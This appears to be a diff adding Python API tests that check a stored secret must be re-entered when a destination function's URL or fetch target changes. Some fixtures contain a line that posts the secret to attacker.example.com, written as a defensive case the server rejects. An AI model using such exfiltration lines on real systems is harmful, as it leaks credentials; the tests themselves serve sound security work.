@@ -1375,6 +1375,85 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
         assert obj.encrypted_inputs["secret1"]["value"] == "I AM SECRET"
         assert obj.encrypted_inputs["secret2"]["value"] == "I AM ALSO SECRET"
 
+    @parameterized.expand(
+        [
+            ("unchanged_url", {}, {"secret": True}, 200),
+            ("body_change", {"body": {"value": "changed"}}, {"secret": True}, 200),
+            ("url_change", {"url": {"value": "https://attacker.example.com"}}, {"secret": True}, 400),
+            ("url_change_omitted_secret", {"url": {"value": "https://attacker.example.com"}}, None, 400),
+            ("url_change_new_secret", {"url": {"value": "https://new.example.com"}}, {"value": "NEW SECRET"}, 200),
+        ]
+    )
+    def test_stored_secret_needs_reentry_when_its_url_changes(
+        self, _name: str, input_changes: dict, secret_input: Optional[dict], expected_status: int
+    ) -> None:
+        payload = {
+            "type": "destination",
+            "name": "Fetch URL",
+            "hog": "fetch(inputs.url, {'body': inputs.body, 'headers': {'Authorization': inputs.secret1}});",
+            "inputs_schema": [
+                {"key": "url", "type": "string", "label": "URL", "required": True},
+                {"key": "body", "type": "string", "label": "Body", "required": False},
+                {"key": "secret1", "type": "string", "label": "Secret 1", "secret": True, "required": True},
+            ],
+            "inputs": {
+                "url": {"value": "https://example.com"},
+                "body": {"value": "hello"},
+                "secret1": {"value": "I AM SECRET"},
+            },
+        }
+        create = self.client.post(f"/api/projects/{self.team.id}/hog_functions/", data=payload)
+        assert create.status_code == 201, create.json()
+
+        inputs = {**create.json()["inputs"], **input_changes}
+        if secret_input is None:
+            inputs.pop("secret1")
+        else:
+            inputs["secret1"] = secret_input
+        res = self.client.patch(
+            f"/api/projects/{self.team.id}/hog_functions/{create.json()['id']}", data={"inputs": inputs}
+        )
+
+        assert res.status_code == expected_status, res.json()
+        stored = HogFunction.objects.get(id=create.json()["id"])
+        if expected_status == 400:
+            assert res.json()["attr"] == "inputs__secret1"
+            assert stored.inputs["url"]["value"] == "https://example.com"
+        assert stored.encrypted_inputs["secret1"]["value"] == (
+            "NEW SECRET" if secret_input == {"value": "NEW SECRET"} else "I AM SECRET"
+        )
+
+    @parameterized.expand(
+        [
+            (
+                "same_url",
+                "fetch('https://example.com', {'method': 'PUT', 'headers': {'Authorization': inputs.secret1}});",
+                200,
+            ),
+            ("new_url", "fetch('https://attacker.example.com', {'body': inputs.secret1});", 400),
+        ]
+    )
+    def test_hog_code_change_needs_secret_reentry_when_its_url_changes(
+        self, _name: str, new_hog: str, expected_status: int
+    ) -> None:
+        payload = {
+            "type": "destination",
+            "name": "Fetch URL",
+            "hog": "fetch('https://example.com', {'headers': {'Authorization': inputs.secret1}});",
+            "inputs_schema": [{"key": "secret1", "type": "string", "label": "Secret 1", "secret": True}],
+            "inputs": {"secret1": {"value": "I AM SECRET"}},
+        }
+        create = self.client.post(f"/api/projects/{self.team.id}/hog_functions/", data=payload)
+        assert create.status_code == 201, create.json()
+        url = f"/api/projects/{self.team.id}/hog_functions/{create.json()['id']}"
+
+        res = self.client.patch(url, data={"hog": new_hog})
+        assert res.status_code == expected_status, res.json()
+        if expected_status == 400:
+            assert res.json()["attr"] == "inputs__secret1"
+            res = self.client.patch(url, data={"hog": new_hog, "inputs": {"secret1": {"value": "RETYPED"}}})
+            assert res.status_code == 200, res.json()
+
     def test_secret_input_turned_public_keeps_a_new_value(self, *args):
         payload = {
             "type": "destination",
